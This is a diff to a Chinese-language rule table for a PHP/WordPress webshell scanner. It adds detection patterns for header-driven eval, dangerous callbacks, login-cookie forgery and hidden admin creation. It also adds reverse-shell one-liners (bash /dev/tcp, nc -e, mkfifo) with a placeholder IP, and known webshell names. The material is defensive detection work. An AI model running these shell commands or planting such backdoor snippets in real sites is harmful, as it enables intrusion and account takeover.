@@ -138,7 +138,13 @@
 | include 请求参数指定的文件 | `include($_GET['p'])` |
 | 按请求参数写文件 | `file_put_contents($_POST['f'], ..)` |
 | 函数名用 base64 藏起来 | `"ZXZhbA=="`（eval）、`c3lzdGVt`（system）等 |
-| 已知 WebShell 特征 | `FilesMan`、`c99shell`、`r57shell`、`b374k`、`wso_version`、`IndoXploit`、`Weevely`、`China Chopper`、`PHPSpy`，并且同时有执行函数 |
+| 请求头内容直接执行 | `eval($_SERVER['HTTP_X_CMD'])`，不走 GET/POST，改从请求头里取代码 |
+| 危险函数当回调处理请求参数 | `array_map('assert', array($_POST['x']))`，`call_user_func('system', $_GET['c'])` |
+| 请求参数存进变量再当函数调用 | `$f=$_POST['f']; $f($_POST['x']);`（200 个字符以内） |
+| 请求参数直接决定登录用户 | `wp_set_auth_cookie((int)$_GET['u'])`，用请求里的用户 ID 直接签发登录 Cookie，等于免密码登录任意账号 |
+| 反弹 shell | `bash -i >& /dev/tcp/IP/端口`；`nc -e /bin/sh`；`mkfifo /tmp/x … /bin/sh -i`；`fsockopen` 后接 `proc_open`、`exec` 等并带 `/bin/sh`。这几条不需要请求参数 |
+| 上传目录里的常见 WebShell 文件名 | 上传目录里叫 `c99.php`、`r57.php`、`wso.php`、`b374k.php`、`indoxploit.php`、`p0wny.php`、`alfashell.php`、`webshell.php`、`filesman.php`（含 `phtml`、`pht`、`phar` 扩展名） |
+| 已知 WebShell 特征 | `FilesMan`、`c99shell`、`r57shell`、`b374k`、`wso_version`、`IndoXploit`、`Weevely`、`China Chopper`、`PHPSpy`、`p0wny`、`Ani-Shell`、`Safe0ver`、`ALFA TEaM`，并且同时有执行函数 |
 | 函数名整批用十六进制藏起来 | 同一个文件里有 6 个以上用十六进制写出来的函数名，例如 `'7068705f756e616d65'`（`php_uname`）、`'617373657274'`（`assert`）。MARIJuANA 之类的文件管理器 WebShell 常用 |
 | 已知 WebShell：MARIJuANA 文件管理器 | 页面标题带 `MARIJuANA`，并且读取 `$_FILES`、`$_GET`、`$_POST` |
 | 十六进制字符串还原代码 | 120 位以上的十六进制串，加 `hex2bin` 或 `pack('H*')` |
@@ -152,6 +158,7 @@
 - 可疑：用 chr 拼出函数名
 - 可疑：遍历目录批量改文件时间（递归 `scandir` 加 `touch`，WebShell 常用它把时间改乱来躲过按修改时间的排查）
 - 可疑：用客户端文件名保存上传（`move_uploaded_file` 的目标用 `$_FILES[..]['name']`）
+- 可疑：代码里直接创建管理员（`wp_create_user`、`wp_insert_user`、`wp_update_user` 的参数里带 `'administrator'`；后门常用它悄悄加账号，但正常的安装向导、会员插件也可能这样写）
 - 可疑：上传目录中的 PHP 文件（内容只有「Silence is golden」的 `index.php` 除外）
 - 可疑：自动包含 PHP 文件（上传目录以外出现 `auto_prepend_file`）
 
